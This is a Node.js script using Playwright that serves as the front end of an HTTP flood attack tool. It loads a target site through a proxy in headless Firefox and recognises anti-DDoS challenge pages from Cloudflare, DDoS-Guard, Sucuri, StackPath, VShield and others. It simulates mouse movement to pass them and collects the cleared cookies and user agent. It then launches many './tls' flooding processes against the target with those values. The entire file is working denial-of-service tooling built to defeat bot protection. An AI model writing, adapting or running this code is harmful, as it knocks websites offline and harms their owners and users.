const playwright = require('playwright');
const cluster = require("cluster");
const {spawn} = require("child_process");


process.on('uncaughtException', function (er) {
    console.error(er)
});
process.on('unhandledRejection', function (er) {
    console.error(er)
});

var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxy = process.argv[5];

if (cluster.isMaster) {
    cluster.fork();
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start browser!');
    solverInstance({
        "Target": target_url,
        "Time": delay,
        "Rate": 100000,
        "Proxy": proxy,
        "Threads": threads,
    });
}



const JSList = {
    "js": [{
        "name": "CloudFlare",
        "navigations": 1,
        "locate": "<title>Just a moment...</title>"
    },{
        "name": "CloudFlare (Secure JS)",
        "navigations": 2,
        "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
    }, {
        "name": "CloudFlare (Normal JS)",
        "navigations": 2,
        "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
    }, {
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    }, {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    }, {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    }, {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    }, {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    }, {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    }, {
        "name": "DDoS-Guard",
        "navigations": 1,
        "locate": "DDoS protection by DDos-Guard"
    }, {
        "name": "VShield",
        "navigations": 1,
        "locate": "fw.vshield.pro/v2/bot-detector.js"
    }, {
        "name": "GameSense",
        "navigations": 1,
        "locate": "<title>GameSense</title>"
    }, {
        "name": "PoW Shield",
        "navigations": 1,
        "locate": "<title>PoW Shield</title>"
    }]
}


function cookiesToStr(cookies) {
    if (Array.isArray(cookies)) {
        return cookies.reduce((prev, {
            name, value
        }) => {
            if (!prev) return `${name}=${value}`;
            return `${prev}; ${name}=${value}`;
        }, "");
    }
}

function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}

function randomIntFromInterval(min,max)
{
    return Math.floor( Math.random()*  ( max - min + 1 ) + min );
}
async function solverInstance(args) {
    const maxAttempts = 3;
    let attempt = 0;

    while (attempt < maxAttempts) {
        try {
            const browser = await playwright.firefox.launch({
                headless: true,
                proxy: {
                    server: 'http://' + args.Proxy
                },
            });

            const page = await browser.newPage();
            await page.goto(args.Target);

            const ua = await page.evaluate(() => navigator.userAgent);

            for (let detect = 0; detect < 5; detect++) {
                var source = await page.content();
                var title = await page.title();
                var JS = await JSDetection(source);
                if (title === "Access denied") {
                    console.log(`Proxy Banned!!!`);
                }
                if (JS) {
                    console.log(`Detect ${JS.name}`);
                    if (JS.name === "VShield") {
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.down();
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
                        await page.mouse.up();
                    }

                    for (let i = 0; i < JS.navigations; i++) {
                        var [response] = await Promise.all([page.waitForNavigation(),]);
                        console.log(`Await redirect ${i + 1}`);
                    }
                }
            }

            const cookies = cookiesToStr(await page.context().cookies());
            await browser.close();
            const [ipAddress, port] = args.Proxy.split(':');
            for (let thread = 0; thread < threads; thread++) {
                const child = spawn('./tls', [args.Target, threads, args.Time, ipAddress, port, ua, cookies]);
                child.stdout.on('data', (data) => {
                    console.log(`stdout: ${data}`);
                });

                child.stderr.on('data', (data) => {
                    console.error(`stderr: ${data}`);
                });

                child.on('error', (error) => {
                    console.error(`error: ${error.message}`);
                });

                child.on('close', (code) => {
                    console.log(`child process exited with code ${code}`);
                });
                //console.log(args.Target, threads, args.Time, ipAddress, port, ua , cookies);
            }
            break; // Выход из цикла, если нет ошибок
        } catch (e) {
            attempt++;
            console.error(`Attempt ${attempt}: ${e.message}`);
            if (attempt === maxAttempts) {
                throw e; // Если достигнуто максимальное количество попыток, пробросить ошибку дальше
            }
        }
    }
}

//Usage: ./tls <url> <threads> <time> <ip> <port> <ua> <cookie>


